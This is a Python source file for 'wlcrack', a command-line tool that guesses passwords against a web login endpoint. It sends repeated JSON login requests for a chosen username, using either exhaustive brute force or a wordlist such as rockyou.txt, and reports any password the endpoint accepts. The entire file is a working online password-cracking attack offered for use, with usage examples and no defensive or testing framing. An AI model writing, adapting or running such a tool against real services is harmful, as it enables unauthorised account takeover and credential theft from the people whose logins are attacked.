import requests
import json
import sys
import time
import itertools
import colorama

helpfile = f"""{colorama.Fore.GREEN}
--request-url            | Select the request url you need from a login page the request url
--user-request           | Select the user request example: username, email or other
--pwd-request            | Select the password request example: password or other
--response-authorization | Select the authorization default is: authorization
--bruteforce             | Select that you make a bruteforce attack on target login page
--wordlist               | Select that you male a wordlist attack on target login page

examples:

wlcrack --request-url https://example.com/v2/auth --user-request username --pwd-request password
        --response-authorization authorization --bruteforce

wlcrack --request-url https://example.com/v2/auth --user-request username --pwd-request password
        --response-authorization authorization --wordlist rockyou.txt

wlcrack --request-url https://example.com/v2/auth --user-request email --pwd-request password
        --response-authorization authorization --bruteforce

wlcrack --request-url https://example.com/v2/auth --user-request email --pwd-request password
        --response-authorization authorization --wordlist rockyou.txt
"""

try:
	if sys.argv[1] == '--request-url':
		request_domain = str(sys.argv[2])
		if sys.argv[3] == '--user-request':
			usrRequest = str(sys.argv[4])
			if sys.argv[5] == '--pwd-request':
				pwdRequest = str(sys.argv[6])
				if sys.argv[7] == '--response-authorization':
					mode = str(sys.argv[8])
					if sys.argv[9] == '--bruteforce':
						bruteforce = True
					elif sys.argv[9] == '--wordlist':
						wordlist = str(sys.argv[10])
						bruteforce = False
					else:
						print(helpfile)
						sys.exit()
				else:
					print(helpfile)
					sys.exit()
			else:
				print(helpfile)
				sys.exit()
		else:
			print(helpfile)
			sys.exit()
	else:
		print(helpfile)
		sys.exit()
except Exception as e:
	print(helpfile +f"\n\n{e}")
	sys.exit()
print(f"{colorama.Fore.BLUE}[+]{colorama.Fore.GREEN} Starting wlcrack password cracking tool... please wait")
print(f"{colorama.Fore.BLUE}[+]{colorama.Fore.GREEN} Testing connection to target request domain: {request_domain}")
time.sleep(1)
try:
	requests.get(request_domain)
except:
	print(f"{colorama.Fore.RED}[-]{colorama.Fore.GREEN} Connection to target domain failed! The selectet domain does not exist")
	sys.exit()
print(f"{colorama.Fore.BLUE}[+]{colorama.Fore.GREEN} Connection to target domain succes! The selectet domain does exist")
if bruteforce == True:
	force = True
else:
	force = False
user = input(f"{colorama.Fore.BLUE}[+]{colorama.Fore.GREEN} Select the username: ")
def login_service(username, password):
	requestSession = requests.Session()
	payload = {
		usrRequest: username,
		pwdRequest: password
	}
	response = requestSession.post(request_domain, json=payload)
	requestSession.headers.update({mode: json.loads(response.content)})
	response = response.content.decode()
	response = response.split(":")
	if response[1] == 'false,"error"':
		return 'failed'
	else:
		return 'succes'

if force == True:
	chars = input(f"{colorama.Fore.BLUE}[+]{colorama.Fore.GREEN} Select the chars[deafault: abcdefghijklmnopqrstuvwxyz]: ")
	chars_list = list(chars)
	for num in range(1, 23):
		for current_key in itertools.product(chars_list, repeat=num):
			current_key = "".join(current_key)
			res = login_service(user, current_key)
			if res == 'succes':
				print(f"{colorama.Fore.BLUE}[+]{colorama.Fore.GREEN} {request_domain} Current-key: {current_key}")
				print(f"{colorama.Fore.BLUE}[+]{colorama.Fore.GREEN} Key found! Username: {colorama.Fore.BLUE}{user}{colorama.Fore.GREEN} Password: {colorama.Fore.BLUE}{current_key}{colorama.Fore.GREEN}")
				sys.exit()
			else:
				print(f"{colorama.Fore.RED}[-]{colorama.Fore.GREEN} {request_domain} Current-key: {current_key}")
	print(f"{colorama.Fore.RED}[-]{colorama.Fore.GREEN} Key not found! All keys testes but we not found a match")
else:
	with open(wordlist, "r") as file:
		main = file.read()
		wlist_splitet = main.split("\n")
		for current_key in wlist_splitet:
			res = login_service(user, current_key)
			if res == 'succes':
				print(f"{colorama.Fore.BLUE}[+]{colorama.Fore.GREEN} {request_domain} Current-key: {current_key}")
				print(f"{colorama.Fore.BLUE}[+]{colorama.Fore.GREEN} Key found! Username: {colorama.Fore.BLUE}{user}{colorama.Fore.GREEN} Password: {colorama.Fore.BLUE}{current_key}{colorama.Fore.GREEN}")
				sys.exit()
			else:
				print(f"{colorama.Fore.RED}[-]{colorama.Fore.GREEN} {request_domain} Current-key: {current_key}")
		print(f"{colorama.Fore.RED}[-]{colorama.Fore.GREEN} Key not found! All keys testes but we not found a match")
		file.close()